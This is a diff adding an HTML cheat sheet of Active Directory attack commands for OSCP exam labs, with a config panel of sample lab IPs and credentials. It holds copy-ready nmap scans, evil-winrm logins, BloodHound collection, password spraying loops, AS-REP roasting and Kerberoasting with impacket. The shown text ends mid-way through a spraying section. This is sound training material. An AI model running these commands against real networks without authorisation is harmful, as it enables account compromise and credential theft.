@@ -1,0 +1,706 @@
+<!-- Local copy of sinogear/OSCP-Cheatshets; author attribution retained. Added to OSCP-web-app with permission confirmed by repository owner. -->
+<!doctype html>
+<!-- ======================================================= -->
+<!--  AD Commands — Quick Reference  |  curated & shared by sinogear  -->
+<!-- ======================================================= --><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>AD Commands — Quick Reference</title>
+<style>
+  :root{
+    --bg:#000000; --surface:#121212; --surface-2:#1a1a1a; --code:#0a0a0a;
+    --fg:#f2f2f2; --muted:#8a8a8a; --border:#272727;
+    --accent:#f0a43a; --accent-soft:#2a2013;
+    --cyan:#5cc9d8; --cyan-soft:#132830;
+    --important:#f0776a; --important-soft:#2c1512;
+    --good:#5bc47a; --good-soft:#102418;
+    --ps:#b79bf5; --ps-soft:#211c38;
+    --kali:#6ea8f7; --kali-soft:#13203a;
+    --m-t1b:#2f9e5c; --m-dc:#ff6868; --m-t1:#5bc47a; --m-t2:#b79bf5;
+    color-scheme:dark;
+    --font-display:"IBM Plex Sans",system-ui,sans-serif;
+    --font-body:"IBM Plex Sans",system-ui,sans-serif;
+    --font-mono:"IBM Plex Mono",ui-monospace,"SFMono-Regular",Menlo,monospace;
+  }
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.5;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:980px;margin:0 auto;padding-block:36px;padding-left:20px;padding-right:20px}
+  .eyebrow{font-family:var(--font-mono);font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);font-weight:600;margin:0 0 8px}
+  h1{font-family:var(--font-display);font-weight:700;font-size:clamp(26px,5.5vw,38px);line-height:1.05;letter-spacing:-.02em;margin:0}
+  .subtitle{color:var(--muted);font-size:14px;margin:10px 0 0;max-width:68ch}
+  header{border-bottom:1px solid var(--border);padding-bottom:18px;margin-bottom:18px}
+
+  .cfg{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px 18px;margin-bottom:18px}
+  .cfg h2{font-family:var(--font-display);font-size:13px;font-weight:600;letter-spacing:.1em;text-transform:uppercase;color:var(--fg);margin:0 0 8px}
+  .cfg .hint{font-size:12px;color:var(--muted);margin:0 0 12px;max-width:70ch}
+  .cfggrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(145px,1fr));gap:9px}
+  .cfgfield label{display:block;font-family:var(--font-mono);font-size:10px;letter-spacing:.04em;text-transform:uppercase;color:var(--muted);margin-bottom:4px}
+  .cfgfield input{width:100%;background:var(--code);border:1px solid var(--border);border-radius:6px;padding:7px 9px;font-family:var(--font-mono);font-size:12.5px;color:var(--fg)}
+  .cfgfield input:focus{outline:2px solid var(--important);outline-offset:-1px}
+
+  nav.jump{display:flex;flex-wrap:wrap;gap:7px;margin-bottom:16px}
+  nav.jump a{font-family:var(--font-mono);font-size:11.5px;padding:5px 11px;border:1px solid var(--border);border-radius:999px;background:var(--surface);color:var(--important);text-decoration:none;white-space:nowrap}
+  nav.jump a:hover{background:var(--important-soft);border-color:var(--important)}
+
+  .legend{display:flex;flex-wrap:wrap;gap:13px;margin-bottom:22px}
+  .legend span{font-family:var(--font-mono);font-size:10.5px;display:flex;align-items:center;gap:6px;color:var(--muted)}
+  .legend i{width:9px;height:9px;border-radius:2px;display:inline-block}
+
+  /* ---- run-through checklist ---- */
+  .checklist{background:var(--surface);border:1px solid var(--important-soft);border-left:3px solid var(--important);border-radius:12px;padding:16px 18px;margin-bottom:22px}
+  .checklist-head{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:10px}
+  .checklist-title{font-family:var(--font-display);font-size:13px;font-weight:600;letter-spacing:.11em;text-transform:uppercase;color:var(--important)}
+  .chk-progress{font-family:var(--font-mono);font-size:12px;color:var(--muted);white-space:nowrap}
+  .chk-row{display:flex;align-items:flex-start;gap:10px;padding:9px 0;border-bottom:1px solid var(--border);cursor:pointer}
+  .chk-row:last-child{border-bottom:none;padding-bottom:0}
+  .chk-row input[type="checkbox"]{margin-top:3px;width:15px;height:15px;accent-color:var(--important);flex:none;cursor:pointer}
+  .chk-row .chk-text{display:flex;flex-direction:column;gap:2px}
+  .chk-row a{font-size:14px;color:var(--fg);text-decoration:none;font-weight:600}
+  .chk-row a:hover{color:var(--important);text-decoration:underline}
+  .chk-sub{font-size:12px;color:var(--muted)}
+  .chk-row:has(input:checked) a{color:var(--muted);text-decoration:line-through}
+  .chk-row:has(input:checked) .chk-sub{text-decoration:line-through;opacity:.65}
+
+  section.blk{margin-bottom:26px}
+  section.blk h2{font-family:var(--font-display);font-size:15px;font-weight:700;letter-spacing:.02em;color:var(--important);margin:0 0 10px;padding-bottom:9px;border-bottom:1px solid var(--important-soft);display:flex;align-items:center;gap:10px;scroll-margin-top:14px}
+  .blk-body{display:flex;flex-direction:column;gap:2px}
+
+  /* ---- lighter sub-grouping label inside a section, grouping by outcome (not collapsible) ---- */
+  h3.subhead-lite{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--kali);background:var(--kali-soft);margin:16px 0 8px;padding:6px 10px;border-radius:6px}
+  h3.subhead-lite:first-child{margin-top:0}
+
+  p.hint{font-size:12.5px;color:var(--muted);margin:10px 0 4px}
+  p.hint:first-child{margin-top:0}
+  p.hint b{color:var(--fg);font-weight:600}
+
+  /* ---- command block: color-coding is the left border only, no text badge ---- */
+  .cmd{background:var(--code);border:1px solid var(--border);border-radius:7px;margin:0 0 6px;overflow:hidden;border-left:4px solid var(--border)}
+  .cmd.sh-kali{border-left-color:var(--good)}
+  .cmd.sh-cmd{border-left-color:var(--cyan)}
+  .cmd.sh-ps{border-left-color:var(--ps)}
+  .cmd.sh-ligolo{border-left-color:var(--accent)}
+  .cmd .row{display:flex;align-items:stretch}
+  .cmd pre{margin:0;padding:8px 11px;overflow-x:auto;flex:1;min-width:0;scrollbar-width:thin}
+  .cmd code{font-family:var(--font-mono);font-size:12.5px;color:var(--fg);white-space:pre}
+  .cmd .var{color:var(--important);font-weight:600}
+  .cmd .var.filled{color:var(--good)}
+  .cmd .var.m-dc{color:var(--m-dc)}
+  .cmd .var.m-t1{color:var(--m-t1)}
+  .cmd .var.m-t1b{color:var(--m-t1b)}
+  .cmd .var.m-t2{color:var(--m-t2)}
+  .cmd .var.filled.m-dc, .cmd .var.filled.m-t1, .cmd .var.filled.m-t1b, .cmd .var.filled.m-t2{color:var(--good)}
+  .cmd .var.m-any, .cmd .var.filled.m-any{color:var(--important)}
+  .cmdname{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:6px 10px;margin:10px 0 4px}
+  .cmdname p.hint{margin:0}
+  .tgt-pick-wrap{position:relative;display:inline-block}
+  .tgt-pick{position:absolute;opacity:0;width:1px;height:1px;overflow:hidden;pointer-events:none}
+  .tgt-pick-btn{appearance:none;display:inline-flex;align-items:center;gap:7px;max-width:160px;background-color:var(--surface-2);border:1px solid var(--border);border-radius:6px;color:var(--fg);font-family:var(--font-mono);font-size:10.5px;padding:5px 10px;cursor:pointer;transition:border-color .15s ease,background-color .15s ease,box-shadow .15s ease}
+  .tgt-pick-btn-label{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .tgt-pick-btn::after{content:'';flex:0 0 auto;width:9px;height:6px;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="10" height="6"><path d="M1 1l4 4 4-4" stroke="%238a8a8a" stroke-width="1.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>') no-repeat center/contain;transition:transform .15s ease}
+  .tgt-pick-btn:hover{border-color:var(--kali);background-color:var(--surface)}
+  .tgt-pick-btn:focus-visible,.tgt-pick-btn[aria-expanded="true"]{outline:none;border-color:var(--kali);box-shadow:0 0 0 3px color-mix(in srgb, var(--kali) 30%, transparent)}
+  .tgt-pick-btn[aria-expanded="true"]::after{transform:rotate(180deg)}
+  .tgt-pick-menu{position:absolute;top:calc(100% + 6px);right:0;min-width:150px;max-width:240px;background:var(--surface-2);border:1px solid var(--border);border-radius:8px;box-shadow:0 10px 28px rgba(0,0,0,.5);padding:4px;z-index:50;opacity:0;transform:translateY(-4px) scale(.98);pointer-events:none;transition:opacity .12s ease,transform .12s ease}
+  .tgt-pick-menu.open{opacity:1;transform:translateY(0) scale(1);pointer-events:auto}
+  .tgt-pick-opt{padding:7px 10px;border-radius:5px;font-family:var(--font-mono);font-size:11px;color:var(--fg);cursor:pointer;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;transition:background-color .1s ease}
+  .tgt-pick-opt:hover,.tgt-pick-opt:focus-visible{background:var(--kali-soft);outline:none}
+  .tgt-pick-opt.sel{color:var(--kali);font-weight:600}
+  .tgt-pick-opt.sel::after{content:'✓';float:right;margin-left:10px}
+  .fab-cfg{position:fixed;right:16px;bottom:16px;z-index:40;display:flex;align-items:center;gap:6px;padding:9px 15px;border-radius:999px;border:1px solid var(--border);background:var(--surface-2);color:var(--cyan);font-family:var(--font-mono);font-size:12px;cursor:pointer;box-shadow:0 4px 16px rgba(0,0,0,.5);opacity:0;transform:translateY(8px);pointer-events:none;transition:opacity .18s,transform .18s}
+  .fab-cfg.show{opacity:1;transform:translateY(0);pointer-events:auto}
+  .fab-cfg:hover{background:var(--cyan-soft);border-color:var(--cyan)}
+  .fab-cfg:focus-visible{outline:2px solid var(--cyan);outline-offset:2px}
+  .copy{flex:none;border:none;border-left:1px solid var(--border);background:transparent;color:var(--muted);font-family:var(--font-mono);font-size:10px;letter-spacing:.05em;padding:0 11px;cursor:pointer}
+  .copy:hover{color:var(--accent);background:var(--surface-2)}
+  .copy.done{color:var(--good)}
+
+  .g{display:grid;grid-template-columns:auto 1fr;gap:10px;align-items:start;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:10px 12px;margin:12px 0 6px}
+  .g .k{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--important);background:var(--important-soft);border-radius:5px;padding:3px 8px;align-self:start;max-width:30vw}
+  .g p{margin:0;font-size:12.5px;color:var(--muted);padding-top:2px}
+
+  footer{border-top:1px solid var(--border);margin-top:24px;padding-top:16px;font-family:var(--font-mono);font-size:11px;color:var(--muted);line-height:1.7}
+  footer a{color:var(--important)}
+
+  @media (max-width:520px){ .cfggrid{grid-template-columns:repeat(auto-fill,minmax(120px,1fr))} }
+
+  /* ---- "first things first" collapsible quick-start (drop menu) ---- */
+  details.ff{background:var(--surface);border:1px solid var(--important-soft);border-left:3px solid var(--important);border-radius:12px;margin-bottom:22px;overflow:hidden}
+  summary.ff-head{font-family:var(--font-display);font-size:15px;font-weight:700;letter-spacing:.02em;color:var(--important);margin:0;padding:13px 16px;display:flex;align-items:center;gap:10px;cursor:pointer;list-style:none;user-select:none}
+  summary.ff-head::-webkit-details-marker{display:none}
+  summary.ff-head .chev{display:inline-block;color:var(--important);font-size:12px;transition:transform .15s;flex:none}
+  details.ff[open] summary.ff-head .chev{transform:rotate(90deg)}
+  details.ff[open] summary.ff-head{border-bottom:1px solid var(--important-soft)}
+  summary.ff-head:hover{background:var(--surface-2)}
+  summary.ff-head:focus-visible{outline:2px solid var(--important);outline-offset:-2px}
+  .ff-head.ff-blue, .ff-head.ff-blue .chev{color:var(--kali)}
+  .ff-head.ff-blue{border-bottom-color:var(--kali-soft)}
+  .ff-head.ff-blue:focus-visible{outline-color:var(--kali)}
+  .subhead-lite.sl-orange{color:var(--accent);background:var(--accent-soft)}
+  .ff-body{padding:14px 16px 4px}
+</style>
+<div class="wrap">
+
+  <!-- sinogear :: header -->
+  <header>
+    <p class="eyebrow">OSCP &middot; PEN-200 &middot; Credentialed AD</p>
+    <h1>AD Commands — Quick Reference</h1>
+    <p class="subtitle">Companion to the full Credentialed AD Playbook — commands only, brief hints, nothing to read through. Same config panel, same accuracy, color-coding instead of text badges. Fill in your boxes once below.</p>
+  </header>
+  <!-- sinogear :: top signature -->
+  <div class="sig" style="text-align:center;margin:2px auto 22px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px;letter-spacing:.14em;text-transform:uppercase;color:#7f8a9b">&mdash;&mdash;&nbsp; curated &amp; shared by <span style="color:#6ea8f7;font-weight:700;letter-spacing:.18em">sinogear</span> &nbsp;&mdash;&mdash;</div>
+
+  <div class="cfg">
+    <h2>Set up this session</h2>
+    <p class="hint">Unfilled values show as <span class="var">$LIKE_THIS</span> in salmon below. Filled ones turn green. Saved in this browser only.</p>
+    <div class="cfggrid">
+      <div class="cfgfield"><label for="cfg-KALI">Kali IP</label><input id="cfg-KALI" data-var="KALI" placeholder="10.10.14.5" value="10.10.14.5"></div>
+      <div class="cfgfield"><label for="cfg-DC">DC IP</label><input id="cfg-DC" data-var="DC" placeholder="10.10.10.5" value="10.10.10.5"></div>
+      <div class="cfgfield"><label for="cfg-T1">Target 1 — external</label><input id="cfg-T1" data-var="T1" placeholder="10.10.10.21" value="10.10.10.21"></div>
+      <div class="cfgfield"><label for="cfg-T1INT">Target 1 — internal</label><input id="cfg-T1INT" data-var="T1INT" placeholder="172.16.5.1" value="172.16.5.1"></div>
+      <div class="cfgfield"><label for="cfg-T2">Target 2 (lateral)</label><input id="cfg-T2" data-var="T2" placeholder="172.16.5.10" value="172.16.5.10"></div>
+      <div class="cfgfield"><label for="cfg-DOMAIN">Domain</label><input id="cfg-DOMAIN" data-var="DOMAIN" placeholder="corp.local" value="corp.local"></div>
+      <div class="cfgfield"><label for="cfg-SUBNET">Internal subnet</label><input id="cfg-SUBNET" data-var="SUBNET" placeholder="172.16.5.0/24" value="172.16.5.0/24"></div>
+      <div class="cfgfield"><label for="cfg-USER">Username</label><input id="cfg-USER" data-var="USER" placeholder="j.smith" value="j.smith"></div>
+      <div class="cfgfield"><label for="cfg-PASS">Password</label><input id="cfg-PASS" data-var="PASS" placeholder="Password123!" value="Password123!"></div>
+      <div class="cfgfield"><label for="cfg-HASH">NTLM hash (NT only)</label><input id="cfg-HASH" data-var="HASH" placeholder="5fbc3d5fec8206a30f4b6c473d68ae76" value="5fbc3d5fec8206a30f4b6c473d68ae76"></div>
+      <div class="cfgfield"><label for="cfg-LHOSTPORT">Listener port</label><input id="cfg-LHOSTPORT" data-var="LHOSTPORT" placeholder="443" value="443"></div>
+      <div class="cfgfield"><label for="cfg-LIGPORT">Ligolo listener port</label><input id="cfg-LIGPORT" data-var="LIGPORT" placeholder="11601" value="11601"></div>
+      <div class="cfgfield"><label for="cfg-DCNAME">DC hostname</label><input id="cfg-DCNAME" data-var="DCNAME" placeholder="DC01" value="DC01"></div>
+      <div class="cfgfield"><label for="cfg-T1NAME">Target 1 hostname</label><input id="cfg-T1NAME" data-var="T1NAME" placeholder="WEB01" value="WEB01"></div>
+      <div class="cfgfield"><label for="cfg-T2NAME">Target 2 hostname</label><input id="cfg-T2NAME" data-var="T2NAME" placeholder="FILES01" value="FILES01"></div>
+    </div>
+  </div>
+
+  <button id="fabCfg" class="fab-cfg" type="button">&#9650; Config</button>
+
+  <nav class="jump" aria-label="Jump to section">
+    <a href="#s-recon">0 · Recon &amp; pivoting</a>
+    <a href="#s-users">1 · Get users &amp; enumerate</a>
+    <a href="#s-edges">BloodHound edge &rarr; exploit</a>
+    <a href="#s-kerb">2 · Kerberoast &amp; AS-REP</a>
+    <a href="#s-spray">3 · Spray &amp; confirm access</a>
+    <a href="#s-more">4 · Found a foothold? Look for more</a>
+    <a href="#s-privesc">5 · Privesc — dump everything</a>
+    <a href="#s-access">Pick your access method</a>
+  </nav>
+
+  <div class="legend">
+    <span><i style="background:var(--good)"></i>KALI — your box</span>
+    <span><i style="background:var(--cyan)"></i>CMD — target, cmd.exe</span>
+    <span><i style="background:var(--ps)"></i>PS — target, PowerShell</span>
+    <span><i style="background:var(--accent)"></i>LIGOLO — proxy console</span>
+  </div>
+
+  <div class="checklist" aria-label="Run-through checklist">
+    <div class="checklist-head">
+      <span class="checklist-title">Run-through checklist</span>
+      <span class="chk-progress" id="chkProgress">0/5</span>
+    </div>
+    <label class="chk-row"><input type="checkbox" class="chk-box" data-chk="1"><span class="chk-text"><a href="#s-users">1 · Get users</a><span class="chk-sub">LDAP dump + BloodHound collection — then validate once with a spray against a live service</span></span></label>
+    <label class="chk-row"><input type="checkbox" class="chk-box" data-chk="2"><span class="chk-text"><a href="#s-kerb">2 · Kerberoast &amp; AS-REP</a><span class="chk-sub">Roastable accounts, AS-REP-able accounts — straight to cracking</span></span></label>
+    <label class="chk-row"><input type="checkbox" class="chk-box" data-chk="3"><span class="chk-text"><a href="#s-spray">3 · Spray &amp; confirm access</a><span class="chk-sub">Every cred you've got, against every service / every user / every IP</span></span></label>
+    <label class="chk-row"><input type="checkbox" class="chk-box" data-chk="4"><span class="chk-text"><a href="#s-more">4 · Found a foothold? Look for more</a><span class="chk-sub">New box, new local files/configs/notes — loop back and check for another way in</span></span></label>
+    <label class="chk-row"><input type="checkbox" class="chk-box" data-chk="5"><span class="chk-text"><a href="#s-privesc">5 · Privesc — dump everything</a><span class="chk-sub">Hashes, descriptions, notes — then re-run BloodHound with whatever's new</span></span></label>
+  </div>
+
+  <details id="s-first" class="ff" open>
+    <summary class="ff-head"><span class="chev">&#9656;</span>First things first</summary>
+    <div class="ff-body">
+      <p class="hint">The moment you've got domain creds — the order to run things in. Each of these also lives in its own section below.</p>
+      <h3 class="subhead-lite">1 &middot; Scan the target (nmap)</h3>
+      <p class="hint">All ports fast, then service/version on whatever is open &mdash; piped through grc for colour</p><div class="cmd sh-kali"><div class="row"><pre><code>mkdir -p nmap &amp;&amp; printf "[*] Target IP: "; read T; grc nmap -p- -T4 -Pn --min-rate 5000 -oN nmap/all_ports.txt "$T" &amp;&amp; PORTS=$(grep open nmap/all_ports.txt | awk -F'/' '{print $1}' | paste -sd,) &amp;&amp; echo "[+] Ports: $PORTS" &amp;&amp; grc nmap -p "$PORTS" -sC -sV -T4 -Pn -oN nmap/scan.txt "$T"</code></pre><button class="copy">COPY</button></div></div>
+      <details class="ff"><summary class="ff-head ff-blue"><span class="chev">&#9656;</span>2 &middot; Connection</summary><div class="ff-body">
+      <p class="hint">SSH (Linux box, or Windows OpenSSH)</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>ssh <span class="var" data-var="USER">$USER</span>@<span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">WinRM shell (5985)</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>evil-winrm -i <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>'</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">RDP (3389)</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>xfreerdp /u:<span class="var" data-var="USER">$USER</span> /p:'<span class="var" data-var="PASS">$PASS</span>' /v:<span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> /cert:ignore +clipboard /dynamic-resolution</code></pre><button class="copy">COPY</button></div></div>
+      </div></details>
+      <h3 class="subhead-lite sl-orange">3 &middot; Ligolo &mdash; pivot in</h3>
+      <p class="hint">Stand up the proxy on Kali and run the agent on Target 1 so the internal subnet is reachable — full steps in the Recon &amp; pivoting section below</p>
+      <h3 class="subhead-lite">4 &middot; Internal host discovery (rustscan.exe)</h3>
+      <p class="hint">From the Windows foothold, sweep the internal subnet for live hosts + open ports</p><div class="cmd sh-ps"><div class="row"><pre><code>.\rustscan.exe -a <span class="var" data-var="SUBNET">$SUBNET</span> --ulimit 5000 -g</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">5 &middot; Port scan a host (rustscan.exe)</h3>
+      <p class="hint">Full port range on one box, so you know what to check or spray</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-ps"><div class="row"><pre><code>.\rustscan.exe -a <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> --ulimit 5000 -r 1-65535</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">6 &middot; Get the domain / DC name</h3>
+      <p class="hint">nxc prints it in its banner even without valid creds; nmblookup is the fallback</p><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nmblookup -A <span class="var m-dc" data-var="DC">$DC</span></code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">7 &middot; Add the DC + both targets to /etc/hosts</h3>
+      <p class="hint">Fill the three hostname fields in the config panel above first</p><div class="cmd sh-kali"><div class="row"><pre><code>echo "<span class="var m-dc" data-var="DC">$DC</span> <span class="var m-dc" data-var="DCNAME">$DCNAME</span>.<span class="var" data-var="DOMAIN">$DOMAIN</span> <span class="var m-dc" data-var="DCNAME">$DCNAME</span>" | sudo tee -a /etc/hosts</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>echo "<span class="var m-t1" data-var="T1">$T1</span> <span class="var" data-var="T1NAME">$T1NAME</span>.<span class="var" data-var="DOMAIN">$DOMAIN</span> <span class="var" data-var="T1NAME">$T1NAME</span>" | sudo tee -a /etc/hosts</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-kali"><div class="row"><pre><code>echo "<span class="var m-t2" data-var="T2">$T2</span> <span class="var" data-var="T2NAME">$T2NAME</span>.<span class="var" data-var="DOMAIN">$DOMAIN</span> <span class="var" data-var="T2NAME">$T2NAME</span>" | sudo tee -a /etc/hosts</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">8 &middot; Export the usernames</h3>
+      <p class="hint">Straight to usernames.txt for the spray later</p><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-dc" data-var="DC">$DC</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' --users-export usernames.txt</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">9 &middot; Collect BloodHound</h3>
+      <p class="hint">Straight from Kali with just these creds</p><div class="cmd sh-kali"><div class="row"><pre><code>bloodhound-ce-python -c All -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' -d <span class="var" data-var="DOMAIN">$DOMAIN</span> -ns <span class="var m-dc" data-var="DC">$DC</span> --zip</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">10 &middot; What do these creds already open?</h3>
+      <p class="hint">Sweep every service on Target 1 with what you've got from the start</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>for proto in smb winrm mssql ldap rdp; do nxc $proto <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' -d <span class="var" data-var="DOMAIN">$DOMAIN</span>; done</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">11 &middot; Build ips.txt</h3>
+      <p class="hint">Drop every in-scope IP (DC, Target 1, Target 2, and anything new) into ips.txt, one per line — the spray and scans read from it</p>
+      <h3 class="subhead-lite">12 &middot; Spray the creds</h3>
+      <p class="hint">Every host in ips.txt, every username you pulled</p><div class="cmd sh-kali"><div class="row"><pre><code>for proto in smb winrm mssql ldap; do nxc $proto ips.txt --continue-on-success -u usernames.txt -p '<span class="var" data-var="PASS">$PASS</span>' -d <span class="var" data-var="DOMAIN">$DOMAIN</span>; done</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">13 &middot; AS-REP roast</h3>
+      <p class="hint">Request hashes for any account with pre-auth off — no password needed, just valid usernames</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-GetNPUsers <span class="var" data-var="DOMAIN">$DOMAIN</span>/ -usersfile usernames.txt -no-pass -dc-ip <span class="var m-dc" data-var="DC">$DC</span> -outputfile asrep.txt</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">14 &middot; Kerberoast</h3>
+      <p class="hint">Request a ticket for every SPN account, straight to a crackable file</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-GetUserSPNs <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span> -dc-ip <span class="var m-dc" data-var="DC">$DC</span> -request -outputfile kerberoast.txt</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">15 &middot; Kerberoast via faketime (clock-skew safe)</h3>
+      <p class="hint">If step 14 dies with clock skew, wrap it in faketime instead of setting the system clock (keeps the VPN/ligolo up)</p><div class="cmd sh-kali"><div class="row"><pre><code>faketime "$(rdate -n -p <span class="var m-dc" data-var="DC">$DC</span> | awk '{print $2, $3, $4, $5, $6}')" impacket-GetUserSPNs <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span> -dc-ip <span class="var m-dc" data-var="DC">$DC</span> -request -outputfile kerberoast.txt</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">16 &middot; Spray per service (edit the host lists)</h3>
+      <p class="hint">One line per service &mdash; set DOMAIN at the top, then trim each line's host list, or delete a whole line to skip that service. Default is every service against every host; T1 &rarr; T2 &rarr; DC (host names pulled from the panel). Uses usernames.txt + passwords.txt (local accounts: swap the -d flag for --local-auth)</p><div class="cmd sh-kali"><div class="row"><pre><code>DOMAIN=<span class="var" data-var="DOMAIN">$DOMAIN</span>   # set DOMAIN in the panel above
+for h in <span class="var" data-var="T1NAME">$T1NAME</span> <span class="var" data-var="T2NAME">$T2NAME</span> <span class="var m-dc" data-var="DCNAME">$DCNAME</span>; do nxc smb   "$h" --continue-on-success -u usernames.txt -p passwords.txt -d "$DOMAIN"; done
+for h in <span class="var" data-var="T1NAME">$T1NAME</span> <span class="var" data-var="T2NAME">$T2NAME</span> <span class="var m-dc" data-var="DCNAME">$DCNAME</span>; do nxc winrm "$h" --continue-on-success -u usernames.txt -p passwords.txt -d "$DOMAIN"; done
